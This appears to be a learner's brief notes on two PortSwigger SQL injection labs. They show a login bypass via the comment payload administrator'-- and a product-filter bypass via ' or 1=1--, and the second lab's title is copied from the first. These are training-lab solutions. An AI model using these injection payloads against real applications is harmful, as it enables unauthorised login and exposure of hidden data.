# Portswigger Lab 

### Lab 1: Lab: SQL injection vulnerability allowing login bypass 
-( [x] )
#### Attempts:

admin:admin 

![alt text](https://github.com/ethansam911/portswigger_labs/blob/main/attempt_1.png)





An idea of what the SQL Query looks like:

```SELECT firstname FROM users WHERE user='administrator'--' and password='password'```

Analysis:

User in question is the administrator

###  Lab 2: Lab: SQL injection vulnerability allowing login bypass 
-( [] )

Analysis:

SQLi in the product category filter.

SQL example when selecting a category


Goal:

Display details of all products in any cateogry, released or unreleased

SQLi:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1 

' creates an internal server error.

'or 1=1-- solves the lab 